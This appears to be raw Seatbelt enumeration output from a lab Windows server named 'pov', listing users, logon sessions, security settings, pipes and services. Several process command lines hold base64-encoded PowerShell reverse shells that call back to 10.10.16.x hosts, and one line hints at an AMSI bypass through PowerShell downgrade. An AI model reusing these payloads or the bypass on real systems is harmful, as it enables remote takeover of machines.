    CommandLine  : "C:\Windows\System32\cmd.exe" /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 3064
    Owner        : 
    CommandLine  : powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 1396
    Owner        : POV\alaading
    CommandLine  : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAwACIALAA5ADAAMAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 1928
    Owner        : POV\alaading
    CommandLine  : C:\Windows\system32\cmd.exe

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 4340
    Owner        : POV\alaading
    CommandLine  : powershell

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 2768
    Owner        : 
    CommandLine  : "C:\Windows\System32\cmd.exe" /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 4656
    Owner        : 
    CommandLine  : powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 2176
    Owner        : POV\alaading
    CommandLine  : C:\Windows\system32\cmd.exe

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 1860
    Owner        : POV\alaading
    CommandLine  : powershell.exe

====== InternetSettings ======

General Settings
  Hive                               Key : Value

  HKCU          DisableCachingOfSSLPages : 1
  HKCU                IE5_UA_Backup_Flag : 5.0
  HKCU                   PrivacyAdvanced : 1
  HKCU                   SecureProtocols : 2048
  HKCU                        User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU             CertificateRevocation : 1
  HKCU              ZonesSecurityUpgrade : System.Byte[]
  HKCU                WarnonZoneCrossing : 1
  HKCU                   EnableNegotiate : 1
  HKCU                      MigrateProxy : 1
  HKCU                       ProxyEnable : 0
  HKCU                      ActiveXCache : C:\Windows\Downloaded Program Files
  HKCU                CodeBaseSearchPath : CODEBASE
  HKCU                    EnablePunycode : 1
  HKCU                      MinorVersion : 0
  HKCU                    WarnOnIntranet : 1

URLs by Zone
  No URLs configured

Zone Auth Settings
====== LAPS ======

  LAPS Enabled                          : False
  LAPS Admin Account Name               : 
  LAPS Password Complexity              : 
  LAPS Password Length                  : 
  LAPS Expiration Protection Enabled    : 
====== LastShutdown ======

  LastShutdown                   : 1/16/2024 1:28:56 AM

====== LocalGPOs ======

====== LocalGroups ======

Non-empty Local Groups (and memberships)


  ** POV\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)

  User            POV\Administrator                        S-1-5-21-2506154456-4081221362-271687478-500

  ** POV\Guests ** (Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted)

  User            POV\Guest                                S-1-5-21-2506154456-4081221362-271687478-501

  ** POV\Remote Management Users ** (Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.)

  User            POV\alaading                             S-1-5-21-2506154456-4081221362-271687478-1001

  ** POV\System Managed Accounts Group ** (Members of this group are managed by the system.)

  User            POV\DefaultAccount                       S-1-5-21-2506154456-4081221362-271687478-503

  ** POV\Users ** (Users are prevented from making accidental or intentional system-wide changes and can run most applications)

  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  WellKnownGroup  NT AUTHORITY\Authenticated Users         S-1-5-11
  User            POV\sfitz                                S-1-5-21-2506154456-4081221362-271687478-1000
  User            POV\alaading                             S-1-5-21-2506154456-4081221362-271687478-1001

====== LocalUsers ======

  ComputerName                   : localhost
  UserName                       : Administrator
  Enabled                        : True
  Rid                            : 500
  UserType                       : Administrator
  Comment                        : Built-in account for administering the computer/domain
  PwdLastSet                     : 11/6/2023 9:57:53 AM
  LastLogon                      : 1/28/2024 1:30:06 AM
  NumLogins                      : 95

  ComputerName                   : localhost
  UserName                       : alaading
  Enabled                        : True
  Rid                            : 1001
  UserType                       : User
  Comment                        : 
  PwdLastSet                     : 11/6/2023 9:59:23 AM
  LastLogon                      : 1/28/2024 3:51:49 AM
  NumLogins                      : 788

  ComputerName                   : localhost
  UserName                       : DefaultAccount
  Enabled                        : False
  Rid                            : 503
  UserType                       : Guest
  Comment                        : A user account managed by the system.
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : Guest
  Enabled                        : False
  Rid                            : 501
  UserType                       : Guest
  Comment                        : Built-in account for guest access to the computer/domain
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : sfitz
  Enabled                        : True
  Rid                            : 1000
  UserType                       : User
  Comment                        : 
  PwdLastSet                     : 11/6/2023 9:57:24 AM
  LastLogon                      : 1/27/2024 11:58:49 PM
  NumLogins                      : 25

  ComputerName                   : localhost
  UserName                       : WDAGUtilityAccount
  Enabled                        : False
  Rid                            : 504
  UserType                       : Guest
  Comment                        : A user account managed and used by the system for Windows Defender Application Guard scenarios.
  PwdLastSet                     : 10/26/2023 1:26:33 PM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

====== LogonSessions ======

Logon Sessions (via WMI)


  UserName              : alaading
  Domain                : POV
  LogonId               : 1852573
  LogonType             : Network
  AuthenticationPackage : NTLM
  StartTime             : 1/28/2024 12:25:27 AM
  UserPrincipalName     : 

  UserName              : alaading
  Domain                : POV
  LogonId               : 2005458
  LogonType             : NewCredentials
  AuthenticationPackage : Negotiate
  StartTime             : 1/28/2024 12:30:55 AM
  UserPrincipalName     : 

  UserName              : alaading
  Domain                : POV
  LogonId               : 10028678
  LogonType             : Interactive
  AuthenticationPackage : NTLM
  StartTime             : 1/28/2024 3:51:49 AM
  UserPrincipalName     : 

  UserName              : alaading
  Domain                : POV
  LogonId               : 1965405
  LogonType             : Network
  AuthenticationPackage : NTLM
  StartTime             : 1/28/2024 12:28:28 AM
  UserPrincipalName     : 

  UserName              : alaading
  Domain                : POV
  LogonId               : 1853673
  LogonType             : Network
  AuthenticationPackage : NTLM
  StartTime             : 1/28/2024 12:25:28 AM
  UserPrincipalName     : 

  UserName              : alaading
  Domain                : POV
  LogonId               : 455020
  LogonType             : Network
  AuthenticationPackage : NTLM
  StartTime             : 1/27/2024 11:35:05 PM
  UserPrincipalName     : 

  UserName              : alaading
  Domain                : POV
  LogonId               : 1947881
  LogonType             : NewCredentials
  AuthenticationPackage : Negotiate
  StartTime             : 1/28/2024 12:28:02 AM
  UserPrincipalName     : 

  UserName              : alaading
  Domain                : POV
  LogonId               : 537274
  LogonType             : Network
  AuthenticationPackage : NTLM
  StartTime             : 1/27/2024 11:36:27 PM
  UserPrincipalName     : 
====== LSASettings ======

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Bounds                         : 00-30-00-00-00-20-00-00
  crashonauditfail               : 0
  fullprivilegeauditing          : 00
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Security Packages              : ""
  Notification Packages          : rassfm,scecli
  Authentication Packages        : msv1_0
  LsaPid                         : 648
  LsaCfgFlagsDefault             : 0
  SecureBoot                     : 1
  ProductType                    : 7
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  restrictanonymous              : 0
  restrictanonymoussam           : 1
====== McAfeeConfigs ======

====== NamedPipes ======

1272,svchost,atsvc
0,Unk,CPFATP_1040_v4.0.30319
0,Unk,CPFATP_1984_v4.0.30319
884,svchost,epmapper
1072,svchost,eventlog
    SDDL         : O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
0,Unk,iisipm8fa9d4d4-cd98-4bce-8bfc-c8450ae782df
0,Unk,iisipme2a812e9-a9ac-42d4-bdc6-f344d0b3ea2b
0,Unk,iislogpipeab22cb60-5aa5-4fab-84ea-945622f19172
0,Unk,iislogpipead0d1de2-54b2-475b-a8d2-c94c022ba287
508,wininit,InitShutdown
648,lsass,lsass
932,svchost,LSM_API_service
0,Unk,nljkIrCyXpuvM4rFolaLKjgDKiZqkYTFgsq8SG4PylWZptHnCRgYC8AVGmutuDzbJVgdJ4S0wAuCgn2JDjoGfvjz9l6ayMg5fxpB6lCSfFaWEKGmazojJZ
628,services,ntsvcs
0,Unk,PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
0,Unk,PSHost.133509007908777766.4256.DefaultAppDomain.powershell
0,Unk,PSHost.133509038703649286.3064.DefaultAppDomain.powershell
3052,wsmprovhost,PSHost.133509039279797144.3052.DefaultAppDomain.wsmprovhost
1396,powershell,PSHost.133509039281347299.1396.DefaultAppDomain.powershell
4340,powershell,PSHost.133509046686568217.4340.DefaultAppDomain.powershell
0,Unk,PSHost.133509146053125641.4656.DefaultAppDomain.powershell
1860,powershell,PSHost.133509165318785531.1860.DefaultAppDomain.powershell
0,Unk,QGlJ2IOHGumHHjcoAzCk4cTnonj7ffu4wF20O7PBx7d4DCulUq3fObPPGCJxGhHebeTQCS3OHAyq7aEe0HmOIHOcRXGnADX6kkimkGaFei91UiUIiif2BZ
2916,svchost,ROUTER
    SDDL         : O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
628,services,scerpc
2252,svchost,srvsvc
2244,svchost,tapsrv
2200,svchost,trkwks
2232,VGAuthService,vgauth-service
    SDDL         : O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
2264,svchost,W32TIME_ALT
0,Unk,Winsock2\CatalogChangeListener-1fc-0
0,Unk,Winsock2\CatalogChangeListener-274-0
0,Unk,Winsock2\CatalogChangeListener-288-0
0,Unk,Winsock2\CatalogChangeListener-374-0
0,Unk,Winsock2\CatalogChangeListener-430-0
0,Unk,Winsock2\CatalogChangeListener-4f8-0
1772,svchost,wkssvc
====== NetworkProfiles ======

ERROR: Unable to collect. Must be an administrator.
====== NetworkShares ======

  Name                           : ADMIN$
  Path                           : C:\Windows
  Description                    : Remote Admin
  Type                           : Disk Drive Admin

  Name                           : C$
  Path                           : C:\
  Description                    : Default share
  Type                           : Disk Drive Admin

  Name                           : IPC$
  Path                           : 
  Description                    : Remote IPC
  Type                           : IPC Admin

====== NTLMSettings ======

  LanmanCompatibilityLevel    : (Send NTLMv2 response only - Win7+ default)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
      NTLMMinServerSec        : 536870912 (Require128BitKey)


  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      : 
====== OptionalFeatures ======

State    Name                                               Caption
ERROR:   [!] Terminating exception running command 'OptionalFeatures': System.Runtime.InteropServices.COMException (0x80070422)
   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)
   at System.Management.ManagementObjectCollection.ManagementObjectEnumerator.MoveNext()
   at Seatbelt.Commands.Windows.OptionalFeaturesCommand.<Execute>d__10.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== OSInfo ======

  Hostname                      :  pov
  Domain Name                   :  
  Username                      :  POV\alaading
  ProductName                   :  Windows Server 2019 Standard
  EditionID                     :  ServerStandard
  ReleaseId                     :  1809
  Build                         :  17763.5329
  BuildBranch                   :  rs5_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  True
  BootTimeUtc (approx)          :  1/28/2024 7:32:06 AM (Total uptime: 00:04:29:23)
  HighIntegrity                 :  False
  IsLocalAdmin                  :  False
  CurrentTimeUtc                :  1/28/2024 12:01:29 PM (Local time: 1/28/2024 4:01:29 AM)
  TimeZone                      :  Pacific Standard Time
  TimeZoneOffset                :  -08:00:00
  InputLanguage                 :  US
  InstalledInputLanguages       :  
  MachineGuid                   :  04c4db02-d65a-48fe-8d1f-f6ba6c321c6a
====== PoweredOnEvents ======

Collecting kernel boot (EID 12) and shutdown (EID 13) events from the last 7 days

Powered On Events (Time is local time)

  1/27/2024 11:32:07 PM   :  startup
====== PowerShell ======


  Installed CLR Versions
      4.0.30319

  Installed PowerShell Versions
      2.0
        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
      5.1.17763.1

  Transcription Logging Settings
      Enabled            : False
      Invocation Logging : False
      Log Directory      : 

  Module Logging Settings
      Enabled             : False
      Logged Module Names :

  Script Block Logging Settings
      Enabled            : False
      Invocation Logging : False

  Anti-Malware Scan Interface (AMSI)
      OS Supports AMSI: True
        [!] You can do a PowerShell version downgrade to bypass AMSI.
====== Processes ======

Collecting Non Microsoft Processes (via WMI)

 ProcessName                              : vm3dservice
 ProcessId                                : 2864
 ParentProcessId                          : 2208
 CompanyName                              : VMware, Inc.
 Description                              : VMware SVGA Helper Service
 Version                                  : 9.17.06.0003
 Path                                     : C:\Windows\system32\vm3dservice.exe
 CommandLine                              : vm3dservice.exe -n
 IsDotNet                                 : False
 ProcessProtectionInformation             : 

 ProcessName                              : VGAuthService
 ProcessId                                : 2232
 ParentProcessId                          : 628
 CompanyName                              : VMware, Inc.
 Description                              : VMware Guest Authentication Service
 Version                                  : 12.3.0.1838
 Path                                     : C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 CommandLine                              : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
 IsDotNet                                 : False
 ProcessProtectionInformation             : 

 ProcessName                              : vmtoolsd
 ProcessId                                : 2220
 ParentProcessId                          : 628
 CompanyName                              : VMware, Inc.
 Description                              : VMware Tools Core Service
 Version                                  : 12.3.0.44994
 Path                                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 CommandLine                              : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
 IsDotNet                                 : False
 ProcessProtectionInformation             : 

 ProcessName                              : vm3dservice
 ProcessId                                : 2208
 ParentProcessId                          : 628
 CompanyName                              : VMware, Inc.
 Description                              : VMware SVGA Helper Service
 Version                                  : 9.17.06.0003
 Path                                     : C:\Windows\system32\vm3dservice.exe
 CommandLine                              : C:\Windows\system32\vm3dservice.exe
 IsDotNet                                 : False
 ProcessProtectionInformation             : 

====== PSSessionSettings ======

ERROR: Unable to collect. Must be an administrator.
====== RDPSessions ======

  SessionID                     :  0
  SessionName                   :  Services
  UserName                      :  \
  State                         :  Disconnected
  HostName                      :  
  FarmName                      :  
  LastInput                     :  12h:01m:29s:972ms
  ClientIP                      :  
  ClientHostname                :  
  ClientResolution              :  
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  

  SessionID                     :  1
  SessionName                   :  Console
  UserName                      :  \
  State                         :  Connected
  HostName                      :  
  FarmName                      :  
  LastInput                     :  12h:01m:29s:980ms
  ClientIP                      :  
  ClientHostname                :  
  ClientResolution              :  
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  

====== RDPsettings ======

RDP Server Settings:
  NetworkLevelAuthentication: 
  BlockClipboardRedirection:  
  BlockComPortRedirection:    
  BlockDriveRedirection:      
  BlockLptPortRedirection:    
  BlockPnPDeviceRedirection:  
  BlockPrinterRedirection:    
  AllowSmartCardRedirection:  

RDP Client Settings:
  DisablePasswordSaving: True
  RestrictedRemoteAdministration: False
====== SCCM ======

  Server                         : 
  SiteCode                       : 
  ProductVersion                 : 
  LastSuccessfulInstallParams    : 

====== Services ======

Non Microsoft Services (via WMI)

  Name                           : ssh-agent
  DisplayName                    : OpenSSH Authentication Agent
  Description                    : Agent to hold private keys used for public key authentication.
  User                           : LocalSystem
  State                          : Stopped
  StartMode                      : Disabled
  ServiceCommand                 : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPath                     : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RP;;;AU)
  CompanyName                    : 
  FileDescription                : 
  Version                        : 7.7.2.1
  IsDotNet                       : False

  Name                           : VGAuthService
  DisplayName                    : VMware Alias Manager and Ticket Service
  Description                    : Alias Manager and Ticket Service
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
